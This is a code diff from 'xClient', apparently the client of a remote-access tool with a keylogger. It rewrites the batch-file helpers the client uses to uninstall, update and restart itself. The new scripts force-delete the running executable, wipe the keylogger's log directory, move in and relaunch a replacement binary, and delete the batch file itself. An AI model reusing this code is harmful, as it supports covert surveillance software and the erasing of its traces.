@@ -1,7 +1,6 @@
 ﻿using System;
 using System.IO;
 using System.Text;
-using xClient.Config;
 using xClient.Core.Cryptography;
 using xClient.Core.Data;
 using xClient.Core.Utilities;
@@ -54,18 +53,13 @@ namespace xClient.Core.Helper
             {
                 string batchFile = GetTempFilePath(".bat");
 
-                string uninstallBatch = (isFileHidden)
-                    ? "@echo off" + "\n" +
-                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                      "ping -n 10 localhost > nul" + "\n" +
-                      "del /A:H " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
-                      "del " + "\"" + batchFile + "\""
-                    : "@echo off" + "\n" +
-                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                      "ping -n 10 localhost > nul" + "\n" +
-                      "del " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
-                      "del " + "\"" + batchFile + "\""
-                    ;
+                string uninstallBatch =
+                    "@echo off" + "\n" +
+                    "echo DONT CLOSE THIS WINDOW!" + "\n" +
+                    "ping -n 10 localhost > nul" + "\n" +
+                    "del /a /q /f " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
+                    "rmdir /q /s " + "\"" + Keylogger.LogDirectory + "\"" + "\n" +
+                    "del /a /q /f " + "\"" + batchFile + "\"";
 
                 File.WriteAllText(batchFile, uninstallBatch);
                 return batchFile;
@@ -82,24 +76,16 @@ namespace xClient.Core.Helper
             {
                 string batchFile = GetTempFilePath(".bat");
 
-                string uninstallBatch = (isFileHidden)
-                    ? "@echo off" + "\n" +
-                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                      "ping -n 10 localhost > nul" + "\n" +
-                      "del /A:H " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
-                      "move " + "\"" + newFilePath + "\"" + " " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
-                      "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
-                      "del " + "\"" + batchFile + "\""
-                    : "@echo off" + "\n" +
-                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                      "ping -n 10 localhost > nul" + "\n" +
-                      "del " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
-                      "move " + "\"" + newFilePath + "\"" + " " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
-                      "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
-                      "del " + "\"" + batchFile + "\""
-                    ;
+                string updateBatch =
+                    "@echo off" + "\n" +
+                    "echo DONT CLOSE THIS WINDOW!" + "\n" +
+                    "ping -n 10 localhost > nul" + "\n" +
+                    "del /a /q /f " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
+                    "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
+                    "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
+                    "del /a /q /f " + "\"" + batchFile + "\"";
 
-                File.WriteAllText(batchFile, uninstallBatch);
+                File.WriteAllText(batchFile, updateBatch);
                 return batchFile;
             }
             catch (Exception)
@@ -114,36 +100,20 @@ namespace xClient.Core.Helper
             {
                 string batchFile = GetTempFilePath(".bat");
 
-                string uninstallBatch =
+                string restartBatch =
                     "@echo off" + "\n" +
                     "echo DONT CLOSE THIS WINDOW!" + "\n" +
                     "ping -n 10 localhost > nul" + "\n" +
                     "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
-                    "del " + "\"" + batchFile + "\"";
+                    "del /a /q /f " + "\"" + batchFile + "\"";
 
-                File.WriteAllText(batchFile, uninstallBatch);
+                File.WriteAllText(batchFile, restartBatch);
 
                 return batchFile;
             }
             catch (Exception)
             {
                 return string.Empty;
-            }
-        }
-
-        public static bool ClearReadOnly(string filePath)
-        {
-            try
-            {
-                FileInfo fi = new FileInfo(filePath);
-                if (!fi.Exists) return false;
-                if (fi.IsReadOnly)
-                    fi.IsReadOnly = false;
-                return true;
-            }
-            catch
-            {
-                return false;
             }
         }
 
